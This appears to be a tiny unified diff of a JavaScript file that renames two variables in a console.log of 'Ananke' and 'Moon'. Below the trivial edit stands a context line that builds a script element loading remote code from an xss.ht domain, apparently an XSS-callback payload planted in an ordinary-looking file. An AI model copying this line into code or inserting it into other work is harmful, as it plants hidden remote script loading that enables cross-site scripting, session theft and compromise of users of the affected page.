@@ -1,6 +1,6 @@
-let a= "Ananke" ; b= "Moon";
+let c= "Ananke" ; d= "Moon";
 
-console.log(a + b);
+console.log(c + d);
 
 var a=document.createElement(\'script\');a.src=\'https://aa51.xss.ht\'; 
           
